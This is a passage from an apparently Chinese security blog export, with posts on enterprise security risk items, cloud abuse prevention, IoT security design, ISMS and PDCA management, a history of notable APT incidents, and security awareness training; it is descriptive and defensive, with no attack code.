缺乏统一账号权限系统 目前Erp系统做为统一账号身份系统，但是权限系统都是自建的，人员异动权限无法及时更新，权限审计困难 堡垒机使用和管理风险 堡垒机权限管理较差，堡垒机未设置专用审计权限账户，系统日志审计差 堡垒机缺少精确到自然人的操作日志审计 堡垒机密码策略不完善，均未设置登录失败处理和账户锁定时间等策略 特权账号管理风险 超级管理员&#x2F;Root&#x2F;大Key权限管理 系统化、流程化、规范化落地特权帐号的管理工作 日志保护制度不明确 需建立对审计日志保护、保留和生命周期管理的高级别保证机制，以符合适用的法律法规和强制性义务，确保提供用户访问的唯一可追溯能力，以检测潜在的可疑网络行为和&#x2F;或文件完整性异常，并提供在安全违规的情况下的取证调查能力。 日志审计缺失风险 堡垒机日志未进行统一管理，缺少定期的操作审计 数据库未进行日志记录功能 网络设备未进行操作行为日志记录 日志远程集中存储缺失风险 主机、WEB服务日志保存本地，且保留时间过短 日志信息中包含敏感信息， 未对日志信息进行脱敏处理。 应用系统没有用户行为操作日志 大量业务的业务日志、应用日志、主机日志等缺乏记录、缺少字段、存储时长较短，造成违背网络安全法的有关事件溯源追查等相关要求。 日志风险，没有全部收集集中存储 八、 数据安全与信息生命周期管理 风险项目 风险描述 缺少数据目录 搜寻并详细列记整个组织的数据资产。 缺少数据分类 应由数据责任人基于数据类型、数据值和对于组织的敏感程度、关键程度，对数据和包含数据的对象进行分类。 数据责任人&#x2F;管理者责任 所有数据的管理工作应被定义，并以文件化形式定义和传达被分配的职责。 重要数据库集中存储与加密未有效管控 应建立策略和规程，并实施支持性业务流程和技术手段，按照适用的法律、法规和合规性义务，以保护敏感数据的存储（如文件服务器、数据库、终端用户工作站）、使用（内存中数据）、传输（如系统交互、跨越公共网络和电子消息） 数据访问鉴权和监控审计未有效管控 运营后台，数据没有脱敏处理，没有进行操作审计 人员变动，访问权限变更不及时 数据库系统&#x2F;大数据系统保护策略缺失 重要数据库系统，没有进程数据库审计 DMS数据库查询系统，权限限制不明确 九、 应急响应与安全事件管理 风险项目 风险描述 针对各类安全威胁结合本部门业务情况，制定切实有效的应急预案，并定期对其进行更新 预案中应至少包含以下部分： 1）严重、高危web漏洞、业务逻辑漏洞、通用漏洞响应与修复 2）信息泄露事件分析、定位与止损 3）拒绝服务攻击响应 业务应用所依赖的通用框架、组件和服务、数据库等，出现重大0day需要紧急修复 预案中应明确RTO、RPO、响应流程、处理方法、主要负责人等信息； 应急响应预案并定期演练 针对应用面临的主要威胁制定应急响应预案并开展贴近真实场景的演练。 定期组织贴近真实情况的演练，提高本部门员工在安全方面的应急响应能力。 事件响应度量指标 风险资产批量综合定位时间长 安全能力检测与防御时间，IoC、IDS、WAF规则，上线时间较长 事件止损措施缺乏 出方向，网络止损隔离时间较长，网络东西向隔离措施缺乏 批量恶意程序检测和杀毒能力缺乏，单机隔离措施缺乏 云计算服务滥用安全防范一、背景云计算服务因易获取、低成本、可靠性等优势，使得越来越多的个人、企业选择使用云服务，由于注册验证过程不严格、促销或免费试用、错误的配置和漏洞等原因，导致云资源被恶意攻击者滥用，网络安全法的出台以及各行业标准的要求，云运营商需要对服务滥用的行为进行识别和阻断。 二、云服务滥用原因●云服务不安全部署：身份密码的泄漏、系统或应用漏洞、身份劫持。 ●利用云服务身份验证漏洞，从事非法活动：伪造、冒用他人身份注册并获取服务。 ●支付漏洞，促销、免费试用活动具有漏洞，黑产从业者抢购大量廉价云计算资源。 三、云服务滥用行为常见的滥用行为包括： ●分布式拒绝服务攻击（DDoS） ●违法内容传播（黄反赌毒暴恐政） ●远程暴力破解（RDP、SSH、Mysql、FTP、Web） ●恶意软件，木马传播 ●数字货币挖矿采矿 ●电子邮件垃圾邮件 ●网络钓鱼攻击活动 CNCERT 的抽样监测结果显示： ●针对境内目标 IP 的 DDoS 攻击中 80.1%的攻击来源为国内云服务提供商； ●C2 远程控制端 IP 中约 59%为国内云服务提供商 IP； ●对外植入网站后门的 IP 中约 39.4%的境内 IP 来源于国内云服务提供商； 四、做好安全防范，抵御恶意攻击 杜绝弱口令，弱口令是最容易出现的也是最容易被利用的漏洞。 为所有服务配置强密码，要求至少 8 个字符以上，包含大小写字母、数字、特殊符号，并且要不定时更新口令。 Web 应用系统，必须使用强密码安全策略和验证码，防止暴力破解和撞库。 数据库系统（Redis、MongoDB、MySQL、MSsql Server）禁止使用弱密码或无密码。 增强安全策略，使用多因素验证机制（MFA）、强制密码安全策略（如：锁定策略），和审计功能（异常告警）。 使用虚拟专有网络（VPC），隔离企业内部不同安全级别的云主机，避免同网络环境下一台服务器被入侵后影响到其它云主机。 在 VPC 中使用 NAT 提供上网服务，禁止云主机直接绑定公网 IP，直接绑定公网 IP 会导致云主机完全暴露在互联网遭受攻击入侵。 对互联网提供服务，通过负载均衡（LB）将需要开放对外的端口（如：80，443）代理到后端的应用服务，并将对外服务放置在独立的子网中。 防火墙隔离（安全组）是云上的主要网络安全隔离手段，通过安全组设置在网络层过滤服务器的访问行为，限定服务器对外&#x2F;对内的的端口访问，授权访问地址，从而减少攻击面，保护服务器的安全。 高危网络端口，开启的服务端口越多越不安全。只对外开放提供服务的必要端口，禁止将 RDP、SSH、Redis、MongoDB、MySQL、MSsql 等高危服务直接暴露在互联网上。","tags":["Cloud"],"categories":["攻防兼备企业安全实践"]},{"title":"IoT 物联网安全架构设计方案","path":"/2020/01/12/secbook/iot-security-architecture-design-solution/","content":"前言共享设备，可穿戴设备，智能家居，金融终端，人脸识别与 AI 等物联网设备增长迅猛，据统计全球的 IoT 设备数量已经达到 70 亿台，并且每年以 20%左右的速度增长。然而，当数以亿计的物联网设备在我们身边无声运转时，各种相关的安全问题也随之而来。物联网设备安全成为产品是否能得到市场认可的最大障碍，物联网设备与系统需要有效的防护措施，以免遭受恶意攻击，盗取和仿造用户身份。 IoT 业务架构云智能物联网从业务架构角度来看，IoT 业务架构分为抽象为 3 层架构： ●物联网感知设备：是物联网系统的最终端设备或传感器，能够通过有线、无线方式发起或传感网络，采集物理信息或接受控制的实体设备。 ●物联网边缘节点：是一套感知设备连接传统信息网络（有线网、移动网等）和传感网的桥梁，简单的感知层网关只是对感知数据的转发，而智能感知层网关将云端计算能力扩展到现场执行智能计算。 ●物联网云端服务：统一设备数据管理，内置规则引擎，将设备数据转发、存储到应用集成可视化、AI 或机器学习等应用；统一设备远程控制管理，包括设备登记、设备鉴权、设备物模型管理等功能。 物联网安全设计 Security for IoT物联网是将感知节点设备通过互联网等网络连接起来构成的一个应用系统，它融合信息系统和物理世界实体，是虚拟世界与现实世界的结合。对物联网机密性、完整性、可用性、私密性的保护，并可能涉及真实性、责任制、不可否认性和可靠性等其他属性。 1.IoT 设备与固件安全●串口安全：IOT 设备一般包含各类串口，并且这些串口缺乏认证机制。一旦暴露给了 hacker，hacker 可以很容易的查找敏感信息和 dump 固件，从而导致各类安全问题。建议厂家在推出 IOT 设备时，尽量关闭各类串口和加强认证机制。 ●默认证书(密码)：默认证书(密码)是攻击者常用攻击目标之一，许多 IOT 设备使用相同的默认密码，并且用户不能主动修改该密码，hacker 可以在几分钟内就暴力破解这些密码，从而导致各类安全问题。Mirai 就是很好的例子，由于默认密码过于简单，并且无法修改，导致厂家只能召回设备修复该问题。 ●硬编码问题：由于开发过程中的不规范，导致很多私钥，API keys，甚至是链接服务器的密码都被硬编码到固件中，导致敏感信息泄漏。可以使用一些自动化的脚本来扫描这类问题。 ●加密：加密主要用于防止对数据和设备的未经授权访问。这一点估计有点困难，因为 IoT 设备以及硬件配置是各种各样的。一个完整的安全管理过程必须包括加密。 ●交付机制：需要对设备持续得更新、打补丁，以应对不断变化的网络攻击。这涉及一些修复漏洞的专业知识，尤其是修复关键软件漏洞的知识。 2.IoT 通讯与协议安全●不安全的网络通信：不安全的网络通信是最常见的安全问题之一，这会导致攻击者获取到敏感信息(on the fly)，甚至搞清楚 IOT 设备的工作方式。例如，在智能家居开发的过程中，由于不安全的网络通信，我们可以伪造各类指令，实现控制整个系统。开发者和攻击者都需要能实现中间人攻击的工具，实现拦截，篡改，发送数据包的功能。 ●不安全的无线通信：IOT 设备的无线通信协议一般是 wifi,BLE,zigbee,6LoWPAN 等。加密密钥一般在固件火灾闪存芯片中(使用 JTAG 或者其他技术可以获取到)。一旦攻击者获得这些密钥，则攻击者可以实现嗅探，篡改，伪造数据包。例如实现一个蠕虫，感染整个网络。开发者最好能保证加密的强度和完整性的校验来提升无线通信过程的安全性。 ●缺乏完整性和签名的校验：对于 IOT 设备来说，完整性校验和签名校验是对抗漏洞利用强有力的手段。这些校验需要分布到 bootloader 一直到 OTA 的各个阶段，甚至是网络通信过程。缺乏这些校验，攻击者很容易就篡改网络中的组建，实现恶意行为，如获取敏感信息或者植入恶意代码。 ●网络安全：IoT 网络现在以无线网络为主。在 2015 年，无线网络的流量已经超过了全球有线网络的流量。由于新生的 RF 和无线通信协议和标准的出现，这使得 IoT 设备面临着比传统有限网络更具挑战性的安全问题。 3.IoT 云端服务安全●不安全的移动和 WEB 应用：不安全的的移动和 WEB 应用是 13 个 IOT 关键安全问题之一。由于开发商缺乏对这类问题的关注，导致数百万用户面临安全风险。hacker 可以利用诸如 SQL 和 XML 注入，身份验证旁路和未经授权的访问等漏洞入侵 IOT 设备，进入工厂或者命令模式获取敏感信息等。 ●接口保护：大多数硬件和软件设计人员通过应用程序编程接口（API）来访问设备，这些接口需要对需要交换数据（希望加密）的设备进行验证和授权的能力。只有经过授权，开发者和应用程序才能在这些设备之间进行通信。 ●身份授权：IoT 设备必须由所有合法用户进行身份验证。实现这种认证的方法包括静态口令、双因素身份认证、生物认证和数字证书。物联网的独特之处在于设备（例如嵌入式传感器）需要验证其他设备。 ●安全分析和威胁预测：不仅必须监视和控制与安全有关的数据，还必须预测未来的威胁。必须对传统的方法进行改进，寻找在既定策略之外的其它方案。预测需要新的算法和人工智能的应用来访问非传统攻击策略。 ●系统开发：IoT 安全需要在网络设计中采用端到端的方法。此外，安全应该至始至终贯穿在整个产品的开发生命周期中，但是如果产品只是传感器，这就会变得略微困难。对于大多数设计者而言，安全只是一个事后的想法，是在产品实现（而不是设计）完成后的一个想法。事实上，硬件和软件设计都需要将安全考虑在整个系统当中。","tags":["IoT"],"categories":["攻防兼备企业安全实践"]},{"title":"信息安全管理体系建设","path":"/2020/01/11/secbook/information-security-management-system/","content":"信息安全管理体系 (ISMS) 是一种通过实施组织内政策、过程、技术和人员来保护信息安全的系统。ISMS 的作用是识别和评估信息安全风险，并采取措施来管理和控制这些风险。 信息安全管理体系价值●遵循法规和法律要求，如数据保护和隐私法规。 ●保护敏感数据，防止信息泄露、篡改或遗失。 ●提高客户和合作伙伴的信任，提高企业声誉和形象。 ●防范和减少网络安全威胁对组织造成的损害。 信息安全管理体系建设1前期评估：对企业的信息安全现状进行评估，了解信息安全需求和风险情况。 2制定信息安全政策：制定信息安全政策，确定信息安全目标和责任。 3设计信息安全体系：根据评估结果和政策，设计信息安全管理体系的组织结构和流程。 4建设信息安全体系：实施信息安全管理体系的建设计划，完善信息安全管理制度。 5检测评估：对信息安全管理体系进行评估和检测，确保信息安全管理体系的有效性。 6完善改进：根据评估结果，不断完善信息安全管理体系。 7维护管理：维护信息安全管理体系，确保信息安全管理体系的长期可持续运行。 信息安全管理体系控制域 1信息安全方针：设立关于信息安全的政策和责任，以确保组织的目标和所有人的利益得到充分的保护。 2信息安全组织：确定并组织负责实施信息安全的管理层、员工以及其他相关人员。 3人力资源安全：要求在雇用、培训、开展业务活动和离职时保护员工、其他人员和组织的信息安全。 4资产管理：确定、识别、评估、监督和保护组织资产，以确保它们的完整性、可靠性、机密性和可用性。 5访问控制：确定访问权限规则，以限制对信息系统和数据的不合法访问。 6加密技术：使用加密技术来保护信息的机密性和完整性。 7物理和环境安全：使用物理和环境安全措施，以防止对信息系统和数据的未经授权的访问、损坏和更改。 8操作安全：确保组织的信息系统的日常操作，在安全的环境中运行。 9通信安全：保护传递的信息，安全传输到目的地。 10系统的获取和开发维护：对信息系统的获取、开发、安装和维护，确保其安全和符合标准。 11供应商关系：与其他公司的关系，确保信息安全不受其他公司的行为影响。 12信息安全事件管理：如何发现、报告、处理和预防信息安全事件。 13业务连续性管理：准备和应对灾难和其他不利影响，以确保业务可以继续运营。 14符合性：确保信息安全符合遵守了相关的法律、法规和标准要求。 信息安全管理体系 PDCA 过程PDCA 是一种实现组织的连续改进循环过程，使组织可以不断地提高效率和质量。PDCA 由以下四个阶段组成： 计划 (Plan):●制定目标，确定执行计划。规划(建立ISMS):建立与管理风险和改进信息安全有关的ISMS 方针、目标过程和规程，以提供与组织总方针和总目标相一致的结果。 ○P1 定义ISMS范围和边界。 ○P2 制定ISMS 方针。 ○P3 确定风险评估方法。 ○P4 实施风险评估。 ○P5 选择、评价和确定风险处理方式、处理目标和处理措施。 ○P6 获得管理者对建议的残余风险的批准。 ○P7 获得管理者对实施和运行ISMS 的授权。 ○P8 编制适用性声明 (SoA)。 执行 (Do)●实施计划，并且进行必要的变更。实施(实施和运行ISMS): 实施和运行ISMS 方针、控制措施、过程和规程。 ○D1 制订风险处理计划。 ○D2 实施风险处理计划。 ○D3 开发有效性测量程序。 ○D4 实施培训和意识教育计划。 ○D5 管理ISMS 的运行。 ○D6 管理ISMS 的资源。 ○D7 执行检测和响应事件的程序。 检查 (Check)●评估计划的执行情况，评估结果。检查(监视和评审 ISMS): 对照ISMS 方针、目标和实践经验，评估并在适当时测量过程的执行情况，并将结果报告管理者以供评审。 ○C1 日常监视和检查。 ○C2 进行有效性测量 ○C3 实施内部审核。 ○C4 实施风险再评估。 ○C5 实施管理评审。 改进 (Act)●根据结果，进行相应的改进，并确定未来计划。(4)处置(保持和改进ISMS):基于ISMS 内部审核和管理评审的结果或其他相关信息，采取纠正和预防措施，以持续改进 ISMS。 ○A1 实施纠正和预防措施。 ○A2 沟通措施和改进情况。","categories":["攻防兼备企业安全实践"]},{"title":"历年最具影响力的 APT 攻击事件汇总 - 持续更新","path":"/2020/01/10/apt/apt-report/","content":"2021 年首次发现感染惠普 iLO 固件的 Rootkit惠普服务器提供一个名为 ilo (又称 ntegrated Lights-Out，集成熄灯)的管理模块，该模块在连接电源线后立即打开，并加载一个完整的专有操作系统。该模块可完全访问服务器上安装的所有固件、硬件、软件和操作系统。除了管理服务器硬件外，它还允许管理员远程开关服务器访问服务器控制台，甚至在服务器上安装操作系统。ilo 的许多方面使其成为恶意软件和 APT集团的理想天堂:极高的权限 (高于操作系统的任何访问级别)、对硬件的极低访问级别、完全不在管理员和安全工具的视线范围内、普遍缺乏检查ilo 和&#x2F;或保护 ilo 的知识和工具、即使在更换操作系统后恶意软件仍能持续存在，尤其是始终运行且从不关闭…..在本报告中，我们分析了在野外发现的一种 rootkit，它隐藏在 ilo 内部，无法通过固件升级删除，而且可以长期隐藏起来。该恶意软件已被黑客使用了一段时间，我们一直在监控其性能。据我们所知，这是世界上第一份在 iLo 周件中发现真实恶意软件的报告。https://threats.amnpardaz.com/en/wp-content/uploads/sites/5/2021/12/Implant.ARM_.iLOBleed.a-en.pdf深入探讨 NSO 零点击 iMessage 漏洞：远程代码执行今年早些时候，公民实验室成功捕获了一个基于 NSO iMessage 的零点击漏洞，该漏洞被用来针对一名沙特活动人士。我们将首次描述野外零点击 iMessage 漏洞利用的工作原理。 根据我们的研究和发现，我们评估 这是我们所见过的技术最复杂的漏洞利用之一，进一步 证明NSO 提供的功能可以与以前认为只有少数民族国家才能使用的功能相媲美。NSO 集团是最知名的“访问即服务”提供商 之一，销售打包的黑客解决方案，使没有本土攻击性网络能力的国家行为者能够“付费”，从而大大增加了拥有此类网络能力的国家数量。https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html2019 年SolarWinds攻击 - 2019年SolarWinds的系统被伪装成虚假软件更新的黑客入侵，然后黑客获取了SolarWinds客户的访问权限，其中包括美国国土安全局和财政部。具有讽刺意味的是，SolarWinds本身就是一家信息技术公司，但却几个月来都未曾察觉到这一漏洞的存在。这次攻击事件表明，即使是IT界和政府机构中最大的参与者也无法免受网络安全攻击的影响，而且鉴于他们雄厚的经济条件，反而有可能成为黑客更具吸引力的目标。2018 年CPU边信道攻击 - 2018年Meltdown、Spectre及CPU边信道攻击，其漏洞信息于2018年1月首次公开、暴露了多数CPU硬件存在的问题，这个问题能让黑客窃取CPU内部当前正在处理的数据，其从根本上改变了当今CPU的设计和制造方式。2017 年Vault7 - 2017年Wikileaks 披露了代号为 Vault 7 的 CIA 黑客工具集。Vault 7 包含了感染 iPhone、Wi-Fi 路由器和思科网关等设备的漏洞利用和文档，被认为是 CIA 历史上已知最大规模的机密信息泄漏。现在，美国政府披露了背后泄密者的身份：29 岁的 Joshua A. Schulte，他已经在一年前就遭到逮捕，FBI 在 Wikileaks 公开第一批 Vault 7 文件后一周就突击搜查了他的家，扣押了手机、电脑和“最高机密的政府情报”，他随即成为泄密调查的主要目标。维基解密爆料，CIA能够通过恶意软件等网络武器控制大量美国、欧洲等地的电子设备和操作系统产品，它能将这些设备变成麦克风展开监听，即便关机仍能录音。对此，CIA作出回应，该机构表示，发起网络攻击、收集情报这都是他们的工作内容，不过它并没有就维基解密曝光文件的真实性作出正面回应。2017 年永恒之蓝 WannaCry - 2017年WannaCry勒索病毒全球大爆发，至少150个国家、30万名用户中招，造成损失达80亿美元三起勒索软件爆发：2017年5月的WannaCry、6月下旬的NotPetya和10月下旬的BadRabbit都是政府支持黑客所开发的工具，WannaCry旨在感染公司并勒索赎金；NotPetya和Bad Rabbit是被部署用来破坏乌克兰企业的网络武器，是俄乌冲突的一部分。2016 年影子经纪人 - 2016年2016年8月至2017年4月间，一群自称“影子经纪人”的黑客拍卖并泄露了由Equation Group所开发的黑客工具，而Equation Group正是NSA的代号。这些工具产生了极大影响，其中一种被成为“永恒之蓝”的工具被用作WannaCry全球勒索软件爆发的主要引擎，一直到今天，影子经纪人还连个影子也没找到。2015 年乌克兰电网黑客 - 2015年这是有史以来首次对电网实施并影响公众的攻击。攻击背后的组织被称作“沙虫”，被认为是俄罗斯军事情报机构一部分。乌克兰电网因被攻击而停电，黑客成功入侵了乌克兰三家能源分配公司的信息系统、暂时中断了最终用户的电力供应，受影响最大的是“Прикарпаттяобленерго”的客户，其关闭了30个变电站、约有23万人断电了1到6个小时；另外还有两家能源分销公司也受到了程度较小的攻击。该攻击使用了一种名为BlackEnergy的恶意软件。2016年12月，攻击者又进行了类似攻击，不过这一次使用了名为“Industroyer”的更为复杂的恶意软件，这次成功切断了乌克兰首都的五分之一。2014 年朝鲜黑客攻击索尼 - 2014年朝鲜黑客Lazarus攻击索尼的目的是要让制片厂放弃发行一部名为《The Interview》的电影，因该电影丑化了金正恩。此前，这些黑客主要攻击目标是韩国，而继美国总统奥巴马对黑客攻击、制裁后，该国的攻击活动遍及全球。2014 年Heartbleed漏洞 - 2014年当时受到影响的服务器数量大概为100万台，需要数年才能将其关闭。其是OpenSSL中比较罕见的安全漏洞之一，能让攻击者从公共服务器检索加密密钥，这些密钥可用于解密流量或在易受攻击的系统上进行身份验证。这个漏洞被公开披露后没几天，就被利用到2014年后的一系列黑客攻击中，虽然多次警告，但服务器运营商仍未修补。2013 年斯诺登泄露事件 - 2013年美国全球监听行动记录斯诺登的暴露可能是十年来最为重要的网络安全事件，其暴露出美国及其“五眼联盟”在“911事件”袭击后建立的全球监视网络，该事件让很多国家创建了自己的监视部门，并加强了外国情报的收集工作，从而导致整个网络间谍活动的增加。美国安局曾拦截华为加装后门美国国安局的监控丑闻在全世界闹得沸沸扬扬。日前，德国《明镜周刊》再度报道称，美国国安局曾经拦截交付途中的笔记本电脑等电子设备，秘密加装监控后门软件，而生产商和客户完全不知情。据报道，国安局底下有一个实施电子监控的“精锐部队”，名为“定制访问行动组”（TAO），专门针对不容易破击和进攻的信息系统。这个行动组曾经入侵了全球许多国家领导人物使用的受到安全加密的电脑系统和电子设备，他们甚至能够通过光纤，拦截窃取信息。据报道，这个行动组，还会拦截一些厂商处于交付途中的电子设备，然后秘密安装后门软件，客户完全不知晓。所涉及的电子产品除了电脑之外，还有硬盘、路由器等。受影响的电子厂商包括思科、戴尔、西部数据、迈拓、三星电子、华为等。《明镜周刊》报道称，国安局的TAO行动组有一个50多页长的电子产品目录，其中的产品可被加装后门软件。据报道，对于电子厂商的任何安全锁定措施，国安局总会找到破解的办法，旗下的破解专家，在技术上已经超越了科技行业的安全部门。对于这则报道，戴尔公司表示，并不了解自家的产品是否被美国国安局加装了后门软件，生产路由器和网络设备的思科也表示，目前并不掌握相关的安全漏洞。美国国安局在全球的监听计划，引发了各国和美国国内公民权利组织的反对。不过，在针对国安局的一宗诉讼中，美国纽约曼哈顿一家法庭日前宣布，国安局监听行为旨在对付恐怖组织，因此合法。美国总统奥巴马表示，将会对国安局监听计划作出调整。NSA入侵中东银行案例首先通过未公开的漏洞利用工具，取得了架设在网络边界上的4台Juniper VPN防火墙的控制权，并在其上安装了Rootkit；然后攻陷内层的企业级防火墙，包括1台Cisco ASA防火墙和1台Juniper防火墙，也在其上安装了Rootkit；之后，攻击者针对内网节点，使用漏洞攻击平台FuzzBunch进行横向移动，并使用5个未公开的漏洞利用工具获得服务器权限，其中包括4个“永恒”系列漏洞和1个“爆炸之罐”漏洞，在攻陷的系统上安装模块化的DanderSpritz木马，先后取得了2台管理服务器和9台业务服务器的控制权；最后通过2个SQL脚本实现了与Oracle服务器的2012 年火焰病毒 2012年Flame：被称为当时有史以来最为先进、最为复杂的恶意软件毒株，该病毒由卡巴斯基所发现，据称与Equation Group（美国家安全局代号）有关联。《华盛顿时报》报道称Flame与Stuxnet是同一批黑客工具的一部分，主要针对伊朗部署。虽然后面再未发现该恶意软件，但其被认为是世界范围内网络间谍活动升级的关键点。2010 年震网病毒 2010年Stuxnet作为世界上首个网络“超级破坏性武器”，最终成功感染了全球超过45000个网络，其中伊朗遭到的攻击最为严重，60%的个人电脑受到感染。该病毒在伊朗工控系统潜伏了5年之久，对伊朗整体核计划的约五分之一造成了重大损害。有专家大胆猜测称，Stuxnet是一种政府型网络武器，这也是第一次使用计算机病毒来操纵物理世界的事件。震网（Stuxnet）：2010年6月中旬，白俄罗斯安全公司VirusBlokAda发现了一种计算机蠕虫，并从其代码关键字中取名“Stuxnet”。2012年经《纽约时报》报道，该病毒是由美国国家安全局在以色列情报部门的协助下共同开发，以奥林匹克网络攻击行动为计划代号，目的是要破坏伊朗核武器计划、销毁伊朗在其核燃料浓缩过程中所使用的西门子SCADA（数据采集与监控系统）设备。Stuxnet同时利用微软和西门子公司产品的7个最新漏洞进行攻击，最初通过感染USB闪存驱动器传播，病毒非常复杂，需要编写者对工业生产过程和工业基础设施十分了解；为了绕过安全产品的检测，该病毒还伪装称Realtek与JMicron两家公司的数字签名。Stuxnet是一个席卷全球工业界的病毒，于2010年6月首次被发现，也是第一个专门定向攻击真实世界中基础设施（控制伊朗核计划的工业控制系统）的“蠕虫”病毒。该病毒在伊朗工控系统潜伏了5年之久，并通过感染超过200,000台计算机以及导致1,000台机器物理降级，对伊朗整体核计划的约五分之一造成了重大损害。据悉，这种病毒采取了多种先进技术，因此具有极强的隐身和破坏力。只要电脑操作员将被感染的U盘插入USB接口，这种病毒就会在神不知鬼不觉的情况下（不会有任何其他操作要求或提示出现）取得一些工业用电脑系统的控制权。 参考链接 https://vx-underground.org/apts.html https://github.com/kbandla/APTnotes https://github.com/aptnotes/data https://www.secrss.com/articles/15576 Ant Design 源码仓库被删除 2021-02-15 41 ，stackoverflow 上有用户发现 Ant Design 项目在 GitHub 上的仓库地址无法访问，疑似被官方删除。经过 Ant Design 官方的初步调查，认定此次事件是受到黑客攻击导致。 Facebook5.33亿用户的数据免费在黑客论坛中泄漏事件调研 https://mp.weixin.qq.com/s/7Eg4ww3tcYsHlh3KdQhKpA 卧底互联网大厂的情报猎人 https://mp.weixin.qq.com/s/Kx0UUVYn-Co8HBsa7gXKlw 微盟删库事件 https://baijiahao.baidu.com/s?id=1660650597296434480 断卡风暴后，虚拟运营商电诈重灾区 https://mp.weixin.qq.com/s/CfKHu5LdulawxSmAg56Lxg","tags":["APT"],"categories":["网络攻防"]},{"title":"企业信息安全意识培训","path":"/2020/01/10/secbook/information-security-awareness-training/","content":"一、信息安全基础概念信息安全，意为保护信息及信息系统免受未经授权的进入、使用、披露、破坏、修改、检视、记录及销毁。黑客通过基于网络的入侵来达到窃取敏感信息的目的，也有被人收买通过网络来攻击商业竞争对手企业，造成网络企业无法正常营运，网络安全就是为了防范这种信息盗窃和商业竞争攻击所采取的措施。 1.信息安全三要素ISO在《ISO&#x2F;IEC 27000: 2014》中定义了信息安全，包括三个主要方面:保密性 (Confidentiality)、可用性(Availability)和完整性 (Integrity)。 保密性(Confidentiality)：确保信息在存储、使用、传输过程中不 会泄漏给非授权用户或实体。 完整性(Integrity)：确保信息在存储、使用、传输过程中不会被非授 权篡改，防止授权用户或实体不恰当地修改信息，保持信息内部和外部的一 致性。 可用性(Availability)：确保授权用户或实体对信息及资源的正常使 用不会被异常拒绝，允许其可靠而及时地访问信息及资源。 2.为什么需要信息安全国家安全的需求 政治、军事、经济、教育对信息的依赖 符合法律、法规的要求 组织持续发展的需要 信息是组织的重要资产 提高服务水平的重要措施 保护核心资产、知识产权、获得竞争优势 向客户证明对信息安全的承诺 内部管理的工具 保护个人隐私与财产的需要 我国对信息安全重要性的表述：“没有网络安全就没有国家安全”，可以认为这个网络安全等同于信息安全。 网络安全为人民，网络安全靠人民，维护网络安全是全社会共同责任，需要政府、企业、社会组织、广大网民共同参与，共筑网络安全防线。 ——2016年4月19日，习近平在网络安全和信息化工作座谈会上发表讲话 3.信息安全的目标漏洞是系统上的一个缺陷，当系统的完整性、保密性和可用性因这个缺陷受到影响时，我们就认为这是一个漏洞。 漏洞的存在对系统来说就是一个风险，当有人利用了这个漏洞并造成了实际的影响，那这就是一个安全事件。 发生的安全事件，对个人、企业或者国家的方方面面都可能产生巨大的损失。那信息安全的目标是：减少信息安全事件导致的损失 二、信息安全风险与事件1.信息安全主要风险信息风险与安全问题，主要来自系统漏洞、黑客频繁侵袭、病毒木马攻击、用户安全防范意识薄弱、用户信息被泄露、虚假不良信息的传播、移动信息安全威胁等方面。 一是黑客攻击由原来的单一无目的攻击转变成为有组织目的性很强的团体攻击犯罪，在攻击中主要以经济利益为目的，采取针对性的集团化攻击方式； 二是目前最有效的网络互联网攻击形式是DDOS攻击，常见的有SYN攻击、DNS放大攻击、DNS泛洪攻击和应用层DDOS攻击； 三是业务支撑系统存在安全漏洞，给病毒、DDOS、僵尸网络、蠕虫、间谍软件等侵入留下可乘之机，对其信息安全造成很大威胁； 四是病毒木马的威胁，很多木马程序和密码嗅探程序等多种病毒不断更新换代对网上银行实施攻击，窃取用户信息，可以直接威胁网上银行安全，其用户上网终端如没有安装木马查杀工具，就很容易被染； 五是信息泄露，业务信息是通过网络传输的，有些业务平台在信息传输、使用、存储、销毁等环节未建立保护信息的有效机制，致使信息很容易出现泄露风险； 六是网络钓鱼，和其他信息安全攻击方式不同，网络钓鱼主要诱骗互联网用户误认为钓鱼网站属于安全网站，很容易将用户信息泄露，虽然政府、企业对此非常重视，但很多钓鱼网站建在境外，很难监管； 七是移动信息安全风险，目前移动终端安全产品APP应用程序非常便捷，但由于用户安全防范意识比较薄弱及很多软件的信息安全存在安全隐患，可能会给用户造成损失； 八是企业的外包服务有可能给服务机构带来数据泄密的风险； 九是内控风险，因业务服务中信息系统与内部控制存在缺陷，也有不适当的操作和人工引发的信息安全风险。 2.信息安全事件案例信息安全损失会有多大呢？我们通过几个例子来说明：个人、企业、国家。 信息泄露导致诈骗导致准大学生死亡 2016年8月19日，某犯罪份子利用某机构泄露的个人信息，对即将踏入大学的女孩徐玉玉进行电话诈骗，导致徐玉玉上大学学费9900元被骗走，徐玉玉伤心欲绝，最终导致心脏骤停，最终于21日离世。 信息安全危及企业生产 2018年8月2日傍晚，全球芯片头号代工厂台积电（TSMC）遭遇勒索病毒Wannacry入侵，致使三大重要生产基地生产线全数停摆。预计约造成87亿元新台币(约合人民币17.6亿元)损失。同时，股价受勒索病毒影响，短时间内蒸发78亿。 信息安全危及国家安全 2010年的夏天“震网”（Stuxnet）病毒首次被发现，9月伊朗核设施突遭震网病毒攻击，纳坦兹离心浓缩厂的上千台离心机报废，由此，伊朗的核计划进程直接倒退两年。 信息安全相关案例 深圳某金融平台遭黑客入侵1600万投资款被盗取 一家互联网科技公司向深圳市公安局反信息诈骗咨询专线报案，称客户多笔资金未按时到帐。但公司财务核对，需向客户支付的款项早已汇出。之后，事主发现有8个商户的帐户资料被黑客通过网络入侵篡改成自己的银行账号，该公司财务向8个陌生账号汇去款项共计1600万元。 中国人寿合作网站随意查80万投保人信息 中国人寿的合作网站“众宜风险管理”搜索信息栏中可以随意查找出所有投保人的信息，包括险种、手机号、身份证号、密码等。事后根据网友查询统计，共发现792270 条投保人信息； 翼龙贷被曝安全漏洞 资金安全引投资者担忧 国内互联网漏洞报告平台乌云披露，翼龙贷被发现重大系统漏洞“翼龙贷某站未授权访问+命令执行导致十几亿资金可随意操作”，严重危害客户资金安全。 多家银行存在内鬼，导致网银用户隐私泄露，受害人损失300多万元 招商银行信用卡中心贷款审核员，向犯罪嫌疑人出售信息300多份。中国工商银行客户经理，通过中介出售公民更征信报告138份。向犯罪嫌疑人出售个人征信报告、银行卡信息的，还有中国农业银行员工董某、中国工商银行。这些信息本属严格保密的信息，在这些银行工作人员手中却被一份十元到几十元的价格大肆兜售。 入侵多家P2P平台篡改客户资料，骗取157万 